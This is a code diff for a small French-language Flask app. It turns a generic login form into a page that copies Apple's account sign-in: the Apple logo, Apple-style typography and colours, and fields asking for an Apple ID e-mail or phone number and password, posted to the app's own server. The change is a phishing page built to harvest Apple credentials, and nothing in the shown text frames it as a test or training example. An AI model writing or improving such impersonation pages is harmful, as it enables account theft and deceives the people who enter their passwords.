@@ -2,18 +2,69 @@ from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
 
-# Formulaire HTML
 login_form = """
 <!DOCTYPE html>
-<html>
-<head><title>Connexion</title></head>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Compte Apple</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            background-color: white;
+            text-align: center;
+            padding-top: 80px;
+        }
+        .logo {
+            width: 100px;
+            margin-bottom: 30px;
+        }
+        .login-container {
+            max-width: 320px;
+            margin: auto;
+        }
+        h2 {
+            font-weight: 600;
+            font-size: 24px;
+        }
+        p {
+            color: #555;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            margin-top: 10px;
+            margin-bottom: 20px;
+            border-radius: 10px;
+            border: 1px solid #ccc;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            background-color: #0071e3;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #005bb5;
+        }
+    </style>
+</head>
 <body>
-  <h2>Connexion</h2>
-  <form method="POST">
-    Nom d'utilisateur: <input type="text" name="username"><br>
-    Mot de passe: <input type="password" name="password"><br>
-    <input type="submit" value="Se connecter">
-  </form>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" class="logo">
+        <h2>Compte Apple</h2>
+        <p>Gérer le compte Apple</p>
+        <form method="POST">
+            <input type="text" name="username" placeholder="E-mail ou numéro de téléphone" required><br>
+            <input type="password" name="password" placeholder="Mot de passe" required><br>
+            <button type="submit">→</button>
+        </form>
+    </div>
 </body>
 </html>
 """
